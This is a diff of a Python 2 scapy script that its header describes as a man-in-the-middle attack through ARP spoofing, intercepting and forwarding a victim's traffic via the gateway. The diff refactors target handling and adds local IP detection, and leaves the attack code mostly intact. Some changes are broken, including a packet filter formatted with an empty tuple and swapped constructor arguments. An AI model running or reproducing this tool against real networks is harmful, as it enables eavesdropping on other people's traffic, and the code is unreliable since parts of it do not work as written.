@@ -2,7 +2,7 @@
 Author: Doron Goldman
 An python program implenting man in the middle attack through arp spoofing
 """
-
+import socket
 import scapy.all as sp
 import sys
 import os
@@ -11,10 +11,15 @@ import threading
 sp.conf.verb = 0
 BROADCAST = "ff:ff:ff:ff:ff:ff"
 REPLAY = 2
-print "hiiii"
+print "hiiiiiiiiiiiii"
 
-class Attack_Thread(threading.Thread, ):
-    TIMEOUT = 30
+class Attack_Info(object, ):
+    def __init__(self, gate_ip, victim_ip, my_ip):
+        self.mIP = my_ip
+        self.gIP = gate_ip
+        self.vIP  = victim_ip
+        self.arp_table = {ip: Attack_Info.get_mac(ip) for ip in [self.vIP,self.gIP]} 
+
     @staticmethod
     def get_mac(IP):
         """
@@ -28,6 +33,10 @@ class Attack_Thread(threading.Thread, ):
         for snd, rcv in ans:
             # format the mac address from the arp replay
             return rcv.sprintf(r"%Ether.src%")
+class Attack_Thread(threading.Thread, ):
+    TIMEOUT = 25
+
+
     @staticmethod
     def set_ip_forward(f):
         """
@@ -40,8 +49,6 @@ class Attack_Thread(threading.Thread, ):
 
     
     def __init__(self,):
-        self.vIP, self.gIP = tuple(raw_input("pls enter " + x + " ") for x in ["victimIP", "gateIP"])
-        self.arp_table = {ip: Attack_Thread.get_mac(ip) for ip in [self.vIP,self.gIP]}     
         self.stop = threading.Event() #used for closing thread and sub threads cleanly
         super(Attack_Thread, self).__init__()
 
@@ -56,7 +63,8 @@ class Attack_Thread(threading.Thread, ):
     def run(self, ):
         self.stop.set()
         try:
-            bpf_filter = " or ".join(map(lambda x: "(src host %s and dst host %s)" %x,  map(lambda x: tuple(self.arp_table.keys()[::x]), [-1,1])))
+            bpf_filter = '(not dst host %s) and (not  src host %s) ' % ()
+            #bpf_filter = " or ".join(map(lambda x: "(src host %s and dst host %s)" %x,  map(lambda x: tuple(self.arp_table.keys()[::x]), [-1,1])))
             self.sniffer = Mitm_Thread(self.stop, bpf_filter)
             self.sniffer.start()
             self.spoof()
@@ -88,13 +96,24 @@ class Mitm_Thread(threading.Thread):
 
     def run(self, ):
         while self.stop.wait(0):
-            sp.sniff(timeout=0.2, prn=self.pkt_handler)
+            sp.sniff(filter=self.bpf_filter, timeout=0.2, prn=self.pkt_handler)
     
     def pkt_handler(self, pkt):
         print pkt.summary()
         sp.send(pkt)
-        
 
+def get_my_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        my_ip = (s.getsockname()[0])
+    finally:
+        s.close()
+    return my_ip
+
+vIP, gIP = tuple(raw_input("pls enter " + x + " ") for x in ["victimIP", "gateIP"])  
+mIP =  socket.gethostbyname(socket.gethostname()) 
+info = Attack_Info(vIP, gIP, mIP)
 a = Attack_Thread()
 a.start()
 raw_input()
